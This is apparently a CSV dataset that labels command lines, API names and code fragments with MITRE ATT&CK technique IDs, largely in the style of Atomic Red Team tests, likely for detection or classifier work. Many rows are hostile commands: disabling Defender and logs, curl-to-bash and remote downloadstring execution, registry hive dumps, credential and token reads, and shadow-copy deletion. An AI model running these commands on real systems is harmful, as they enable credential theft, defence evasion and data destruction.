command,mitre_id
"Set-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"" -Name DisableAntiSpyware -Value 1",T1562
"rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta",T1218
docker run --name t1046_container --rm -d -t t1046,T1046
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration"" /v Notification_Suppress /t REG_DWORD /d 1 /f",T1112
if ($errCode -eq 86) {,T1098
CreateProcessAsUserA,T1134
chown $owner $file_or_folder,T1222
cat /proc/cpuinfo | grep -c “cpu family” 2>&1,T1082
reg query HKLM /f password /t REG_SZ /s,T1552
execvpe,T1574
"C:\Windows\System32\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su {CMD}",T1053
chmod u+s /tmp/hello,T1548
ls -l $test_folder,T1560
"Write-Host ""Using EDR-Freeze executable: $edrFreezeExeName"" -ForegroundColor Cyan",T1562
"Invoke-Expression ""$input_file""",T1027
"if [ ""$(sysctl -n hw.model | grep -v 'Mac')"" != """" ]; then echo 'Virtualization Environment detected'; fi;",T1497
"auditctl -a always,exit -F arch=b64 -S execve -k CMDS",T1056
condition,T1556
svchast.exe,T1036
sudo touch /Library/StartupItems/EvilStartup.plist,T1037
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1,T1036
HKCU\Software\Policies\Google\Chrome\ExtensionInstallForcelist,T1112
"rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},,1,",T1218
curl -s $remote_url |bash,T1059
libc read,T1056
"if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo ""\$HISTFILESIZE is zero""; else HIST_LENGHT=$(wc -l $HISTFILE); echo ""\$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT""; fi",T1562
chmod $symbolic_mode $file_or_folder,T1222
net localgroup users,T1069
"Get-TransportAgent | Format-List Name,Enabled",T1505
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run,T1012
schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I,T1053
Zone.Identifier,T1553
"HKEY_CURRENT_USER\Environment ""UserInitMprLogonScript""",T1037
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f",T1112
Add-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $sp.ObjectId,T1098
cmd.exe /c net share,T1135
Set-MpPreference -DisableBlockAtFirstSeen 1,T1562
"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCANetwork /t REG_DWORD /d 1 /f",T1112
Get-ADComputer $hostname -Properties *,T1087
.AvosLinux,T1486
win.exe,T1036
/System/Librarby/LaunchDaemons/ssh.plist,T1569
& $imewdbled $remote_url,T1105
"Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name ""PortNumber"" -Value $NEW_Remote_Port",T1021
get-localgroup,T1069
if ($archive) { $archive.Dispose() },T1562
chmod 777,T1222
"reg add ""HKLM\SYSTEM\CurrentControlSet\Control\FileSystem"" /v SymlinkRemoteToRemoteEvaluation /t REG_DWORD /d ""1"" /f",T1222
"secedit /import /db $secedit_db /cfg ""$ini_file""",T1547
HKCU\Software\Classes\Applications\rundll32.exe\shell\open,T1112
"(user permissions),",T1564
Remove-Variable xlApp,T1204
if ($tcp.Connected) {,T1046
New-Item -Path $outDir -ItemType Directory -Force | Out-Null,T1083
makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab,T1564
[attrib](https://attack.mitre.org/software/S1176) +h,T1564
reg save HKLM\system system,T1003
sudo $program_path -4 -p 6 -t 3,T1040
clear logging,T1070
Get-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append $File_to_output,T1083
GetComputerNameExA,T1106
service pf stop,T1562
Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProtocolDefaults' -Name 'https' -Value 0,T1112
"} elseif (Test-Path -Path ""$env:SystemRoot\SysWOW64\rdrleakdiag.exe"") {",T1003
.JPE,T1036
odbcad32.exe,T1548
MYSQL_HISTFILE,T1562
"Write-Host ""Error parsing JSON data.""",T1539
then sed -i '$ a #art_test_1562_006_2' /etc/$rsyslog_config_file_name,T1562
WriteProcessMemory(),T1574
"Invoke-EnumerateAzureBlobs -base $base -permutations ""$wordlist"" -outputfile ""$output_file""",T1619
OpenThread,T1055
"date ""$NOW""",T1070
get-localuser,T1087
which sh,T1083
evtx,T1005
InvokeGPUpdate,T1059
uname -srm,T1059
cmdl32 /vpn /lan %cd%\config,T1105
aws logs create-log-group --log-group-name $cloudwatch_log_group_name --region $region --output json,T1562
install_flash_player.exe,T1036
Set-CASMailbox,T1098
Connect-AzureRmAccount -Credential $Credential,T1555
certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe},T1105
where /R C:\Users\ Bookmarks,T1217
HKCU\Software\Microsoft,T1027
.msc,T1546
LogMein,T1219
"reg add ""HKLM\Software\Microsoft\Windows Defender"" /v ""PUAProtection"" /t REG_DWORD /d ""0"" /f >NUL 2>nul",T1562
GetSystemTimeAsFileTime,T1497
Evil.txt,T1036
wbadmin delete catalog -quiet,T1490
"ls -la ""$SITE_PACKAGES/atomic_hook.pth""",T1546
echo [InternetShortcut] > $shortcut_file_path,T1547
IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing),T1552
Start-ATHProcessUnderSpecificParent -ParentId $parent_pid -TestGuid $test_guid,T1134
.zshrc,T1546
"@FOR /F %n in (computers.txt) DO @FOR /F ""tokens=1,2"" %i in ('qwinsta /server:%n ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > usernames.txt",T1033
"Start-Process -FilePath ""$autoit_path"" -ArgumentList ""$script_path""",T1059
AdjustTokenPrivileges,T1134
reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v SystemBiosVersion,T1082
using System;,T1562
"cscript ""$vbscript""",T1082
"dir /s /a c:\ >> ""C:\windows\TEMP\[RANDOM].tmp""",T1083
nltest /domain_trusts,T1016
NtCurrentPeb,T1106
"$sheet.Cells.Item(4,1) = ""=IF(ISNUMBER(SEARCH(`""64`"",GET.WORKSPACE(1))), GOTO(A5),)""",T1204
"wmic.exe process call create ""{CMD}""",T1218
oci.dll,T1574
JamPlus,T1127
New-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription,T1098
sensitivefiles -noninteractive -consoleoutput,T1552
iviewers.dll,T1036
com.apple.loginwindow.[UUID].plist,T1547
locate *,T1083
"reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify""",T1012
RegCreateKeyExA,T1112
net view,T1018
[System.Windows.Forms.SendKeys]::SendWait('{ENTER}'),T1202
DriveList,T1680
ScriptingEngine='VBScript';,T1546
"find $file_path/.config/gcloud -name ""credentials.db"" -o -name ""access_tokens.db"" -type f 2>/dev/null",T1552
echo Password!>> passwords.txt,T1110
curl http://myip.ipip.net,T1016
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\OutlookM,T1547
"Write-Host ""Failed to download or extract EDR-Freeze: $_"" -ForegroundColor Red",T1562
netstat -naop tcp,T1049
WinExec,T1546
CreateProcessWithTokenW,T1134
rundll32.exe “C:\Windows\twain_64.dll”,T1218
/failure,T1562
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1'),T1106
ls -la ~/Desktop,T1083
echo '# REQUIRE: LOGIN' >> $rc_service_path/$rc_service_file,T1543
"echo ""# THIS IS A COMMENT"" >> /etc/default/ufw",T1562
lPH*.dll,T1083
winfile.exe {PATH:.exe},T1202
"Write-Host ""End of password spraying""",T1110
NtCreateProcess,T1106
mspub.exe {REMOTEURL},T1105
security find-certificate -a -p > $cert_export,T1555
"reg add ""HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services"" /v ""DisableSecuritySettings"" /t REG_DWORD /d 1 /f",T1112
"Invoke-WebRequest ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat"" -OutFile $output_file",T1074
GetCurrentProcessId,T1057
sc query sense,T1518
ChangeServiceConfig,T1543
sc query,T1007
reg save HKLM\\SECURITY security.hiv,T1003
regsvr32,T1218
"msedgewebview2.exe --utility-cmd-prefix=""{CMD}""",T1218
Wow64DisableWow64FsRedirection(),T1106
Pcwrun.exe {PATH_ABSOLUTE:.exe},T1218
Control_RunDLL,T1218
postrm,T1546
com.random.name.plist,T1543
net group Exchange Trusted Subsystem /domain,T1069
"if [ ""$HISTCONTROL"" != ""ignoreboth"" ]; then export HISTCONTROL=""ignoreboth""; fi",T1562
if (!(Test-Path $UserDir)) { New-Item -ItemType Directory -Path $UserDir -Force },T1546
public class TokenAdjuster {,T1562
tty_tickets,T1548
"detectorId=$(aws guardduty create-detector --enable --region ""$region"" | grep -oP '(?<=""DetectorId"": "")[^""]*')",T1562
"""$venv_path\Scripts\adidnsdump"" -u $user_name -p $acct_pass --print-zones $host_name",T1018
AppServicesr,T1036
/Library/LaunchAgents,T1543
"if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))",T1562
sudo visudo -c -f /etc/sudoers,T1548
"Copy-Item ""$dll_path"" C:\Users\Public\AtomicTest.dll -Force",T1546
"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender"" -Name ""DisableAntiSpyware"" -Value 1",T1562
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList,T1564
"Start-Process -FilePath $file ""/S""",T1219
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore,T1558
truncate --size=0 /var/log/security #size parameter,T1070
"Write-Output ""Function code download failed.""",T1528
RestrictedAdmin,T1550
PotPlayerDB.dat,T1036
diskshadow delete shadows all,T1490
{if (test-connection -Count 1 -computername $machine -quiet),T1105
"Write-Host ""The file is empty""",T1560
~/Downloads,T1486
"if ($ipAddr -eq """") {",T1046
"net group ""REDACTED"" /domain",T1087
scheduler,T1053
"{foreach($file in (dir $Dir_to_copy ""*.7z""))",T1048
C:\,T1059
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control SystemStartOptions,T1012
$xlApp.DisplayAlerts = $False,T1204
injecthelper.dll,T1055
if command -v ss >/dev/null 2>&1; then ss -antp 2>/dev/null || ss -ant; ss -aunp 2>/dev/null || true; else lsof -i -nP 2>/dev/null || true; fi,T1049
reg export HKLM\security %temp%\security,T1003
"cp ""$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt"" /tmp/",T1110
CGWindowListCreateImageFromArray,T1113
InternetQueryOptionA,T1016
Team Viewer,T1219
"Copy-Item ""$env:APPDATA\Opera Software\Opera Stable\Login Data"" -Destination ""PathToAtomicsFolder\..\ExternalPayloads""",T1555
dir c:\ /b /s .key | findstr /e .key,T1552
printf $ENCODED | xxd -r -p,T1140
wificreds -consoleoutput -noninteractive,T1555
Get-EventLog -list,T1070
"Write-Output ""Fetching all blobs from container $($row.ContainerName) in storage account $($row.StorageAccountName) ...""",T1530
GetWindowThreadProcessId,T1106
takeown /F C:\Windows\System32\DisplaySwitch.exe /A,T1546
"Send-MailMessage -From $sender -To $receiver -Subject 'T1027_Atomic_Test' -Attachments ""$input_file"" -SmtpServer $smtp_server",T1027
echo $ENCODED > $encoded_file && cat $encoded_file | base64 -d,T1140
"if ($allowSharedKeyAccess -eq ""false"") { # $allowSharedKeyAccess could be true or null",T1528
"Start-Process -FilePath ""$ved_path\VEDetector.exe""",T1036
Get-Content $env:TEMP\silver.txt,T1558
"logger.exe ""{CMD}""",T1202
"$which_python -c ""import pty;pty.spawn('/bin/sh')""",T1059
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1'),T1082
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run,T1060
pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct},T1216
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t REG_DWORD /d 0 /f,T1564
sc query windefend,T1518
HKCU\Software\Microsoft\CurrentVersion\Run\,T1547
"Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\PptVBAaddin.ppam"" ""$env:APPDATA\Microsoft\Addins\notepad.ppam""",T1137
schtasks /create /sc minute /mo 1 /tn QQMusic ^ /tr C:Users\%USERPROFILE%\Downloads\spread.exe /F,T1053
IconEnvironmentDataBlock,T1027
Mavinject.exe 4172 /INJECTRUNNING {PATH_ABSOLUTE}:file.dll,T1564
sudo dscl . -create /Users/$user_name UniqueID 333,T1564
Import-Module -Name AzureAD,T1098
dscl . -append /Groups/admin GroupMembership AtomicUser,T1078
pkill cfprefsd,T1562
"$sheet.Cells.Item(1,1) = ""$uname""",T1204
Mftrace.exe {PATH:.exe},T1127
PutBucketLifecycle,T1485
sudo sysadminctl -guestAccount on,T1078
$requiredGraphAccess.ResourceAccess.Add($resourceAccess),T1098
LVM_GETITEMPOSITION,T1055
schtasks /create /sc,T1053
SetWindowsHookEx,T1056
Select * From Win32_SystemDriver,T1047
unzip,T1140
/sbin/udevd -d,T1036
"AgentExecutor.exe -powershell ""{PATH_ABSOLUTE:.ps1}"" ""{PATH_ABSOLUTE:.1.log}"" ""{PATH_ABSOLUTE:.2.log}"" ""{PATH_ABSOLUTE:.3.log}"" 60000 ""C:\Windows\SysWOW64\WindowsPowerShell\v1.0"" 0 1",T1218
Function,T1553
advapi32.dll,T1070
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1'),T1106
KRB5CCNAME,T1558
aws configservice delete-delivery-channel --delivery-channel-name $delivery_channel_name --region $region,T1562
.com,T1036
"reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer"" /t REG_DWORD /v ""Enabled"" /d ""1"" /f",T1547
ssh_kill,T1489
"reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows""",T1012
"([adsisearcher]""objectcategory=computer"").FindAll(); ([adsisearcher]""objectcategory=computer"").FindOne()",T1018
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force,T1548
kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token,T1552
sc.exe start $service_name,T1543
"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\DefragPath"" /t REG_EXPAND_SZ /d ""%systemroot%\system32\notepad.exe"" /f",T1112
"Get-Item -Path ""HKLM:SYSTEM\CurrentControlSet\Control\SafeBoot""",T1012
"C:\Windows\System32\inetsrv\appcmd.exe set config ""$website_name"" /section:httplogging /dontLog:true",T1562
/etc/ssh/sshd_config,T1098
net view \\remotesystem,T1135
mktemp -t Installer,T1564
wbadmin.msc,T1218
<script>,T1027
Win32_OperatingSystem,T1518
GetUserDefaultLangID,T1614
echo before,T1547
Start-Process whoami.exe,T1546
